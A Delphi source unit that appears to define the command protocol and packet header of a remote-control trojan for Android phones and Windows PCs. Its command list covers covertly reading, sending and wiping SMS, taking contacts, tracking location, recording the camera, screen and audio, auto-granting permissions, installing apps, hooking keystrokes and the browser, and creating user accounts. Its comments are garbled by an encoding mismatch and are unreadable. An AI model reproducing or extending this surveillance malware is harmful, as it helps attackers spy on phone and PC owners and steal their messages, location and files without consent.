unit uOrder;

interface
uses  windows;
const

  //���ݴ���Э���ͷ��
  UID:integer=8888;//��ͷ��ʶ;
  VER:integer=1002;
  ENC:integer=7619;

  CMD_TEST=1000;//���ԣ�

  CMD_READY=1001;//׼��������;

  CMD_INFO=1002;//��ȡ��Ϣ����;
  CMD_SMS_CONTENT = 3001;//��ȡ�����������
  CMD_SMS_SEND = 3002;//���Ͷ������
  CMD_CONTACT_CONTENT = 3004;//ͨѶ¼��
  CMD_SMS_SENDS = 3005;//Ⱥ�����ţ�
  CMD_SMS_CLEAR = 3006;//��ն��ţ�
  CMD_CALL=1004;//��ȡ����;
  CMD_LOCK=1005;//��������;
  CMD_SHOT=1006;//��������;
  CMD_SHOTCODE=1007;//��������;
  CMD_RETURN=1008;//����
  CMD_POS=1009;//�������
  CMD_LIGHT=1010;//��������;
  CMD_GIVE_POWER=1011;//�Զ���Ȩ����;
  CMD_CAMERA=1012;//������
  CMD_SLIDE=1013;//�������
  CMD_CMD=1014;//ִ��CMD���
  CMD_GET_CMD_OUT=1015;//��ȡִ��CMD��������
  CMD_REBOOT=1016;//�����ֻ���
  CMD_SHUTDOWN=1017;//�ػ���
  CMD_RESTART=1018;//����Ӧ�ã�
  CMD_UNLOCK=1019;//����ҵ�������
  CMD_RECORD_SCREEN_START=1020;//¼����ʼ��
  CMD_RECORD_SCREEN_END=1021;//¼��������
  CMD_RECORD_VIDEO_START=1022;//¼��ʼ��
  CMD_RECORD_VIDEO_END=1023;//¼�������
  CMD_HOME=1024;//��������
  CMD_GET_INSTALL_APP_INFO=1025;//��ȡ�Ѱ�װ��Ӧ����Ϣ��
  CMD_INSTALL_APP=1026;//��װ��
  CMD_UNINSTALL_APP=1027;//ж�أ�
  CMD_RUN_APP=1028;//���У�
  CMD_KILL_APP=1029;//��ֹ���У�
  CMD_LONG_CLICK=1030;//�������
  CMD_INPUT=1031;//���� ���
  CMD_CAMERA_CAP_START=1032;//¼��ʼ��
  CMD_CAMERA_CAP_END=1033;//¼�������
  CMD_INSERT_IMG_TO_GALLERY=1034;//��Ƭ���뵽��᣻
  CMD_SOUND_CAP_START=1035;//ʰ����ʼ��
  CMD_SOUND_CAP_END=1036;//ʰ������

  CMD_CONTROL=1900;//ת��ר����� ���ƶ����ߣ�
  CMD_LIST_CLIENT=1901;//ת��ר������оٱ��ضˣ�
  CMD_ADD_CLIENT=1902;//ת��ר��������ض����ߣ�
  CMD_DEL_CLIENT=1903;//ת��ר��������ض����ߣ�
  CMD_REQUEST_USER_ID=1904;//�����û�ID

  CMD_LOCATION_SINGLE = 2001;//��ȡ��λ��Ϣ��
	CMD_LOCATION_SERIES = 2002;//������ȡ��λ��Ϣ��
  CMD_LOCATION_STOP = 2003;//ֹͣ��ȡ��λ��Ϣ��

  CMD_FILE_LIST=4001;//�о�Ŀ¼�����ݾ���·����
  CMD_FILE_TRANS=4002;//�ļ�����
  CMD_FILE_DEL=4003;//ɾ���ļ�

  FILE_DIR_ROOT=4100;//��Ŀ¼��
  FILE_DIR_EX_SD = 4101;//����SD��Ŀ¼��־;
	FILE_DIR_SD = 4102;//����SD��Ŀ¼��־;
	FILE_DIR_PHOTO = 4103;//���Ŀ¼;

  
  //-----------------------����Ŀ¼����---------------------------------
  //DIR_EXT_SD:string='';
  //**********************һ������*******************************
  o_READY=00;
  o_Screen=2010;
  o_KeyMouse=2020;
  o_PCInfo=2030;
  o_TransFiles=2040;
  o_ListDrvs=2050;
  o_ListFileInfos=2060;
  o_ListProcs=2070;
  o_opProc=2080;
  o_Reg=2090;
  o_ReNamePC=2100;
  o_GetPCName=2110;
  o_opHookKey=2120;
  o_HookIE=2150;
  o_UnHookIE=2160;
  o_Close=2170;
  o_Update=2180;
  o_RunFile=2190;
  o_DelFile=2200;
  o_Delete=2210;
  o_CrtDir=2220;
  o_DelDir=2230;
  o_CAD=2240;
  o_Svc=2250;
  o_Reboot=2260;
  o_CrtUser=2270;
  o_TermSvr=2280;
  o_GetCID=2290;    //06-05-13
  o_Add=2300;       //06-05-13
  o_CMD=2310;       //06-08-13
  o_video=2320;       //06-11-11
type
  POrderHeader=^stOrderHeader;
  stOrderHeader=packed record
    uid:DWORD;
    Ver:DWORD;
    Enc:DWORD;
    id:DWORD;
    pid:DWORD;
    cmd:DWORD;
    len:DWORD;
    dat:pointer;
  end;
  function VerifyOH(oh:stOrderHeader) :boolean;//У���ͷ;
  function formatOH(var oh:stOrderHeader) :stOrderHeader;//��ʽ����ͷ;
var
  id:DWORD;
implementation
function VerifyOH(oh:stOrderHeader) :boolean;//У���ͷ;
begin
  result:=true;
  if(oh.uid<>UID)then result:=false;
  if(oh.Ver<>VER)then result:=false;
  if(oh.ENC<>ENC)then result:=false;
end;
function formatOH(var oh:stOrderHeader) :stOrderHeader;//��ʽ����ͷ;
begin
  oh.uid:=UID;
  oh.Ver:=VER;
  oh.Enc:=ENC;
  oh.id:=id;
  oh.pid:=0;
  oh.cmd:=CMD_READY;
  oh.len:=0;
  oh.dat:=nil;
  result:=oh;
end;
end.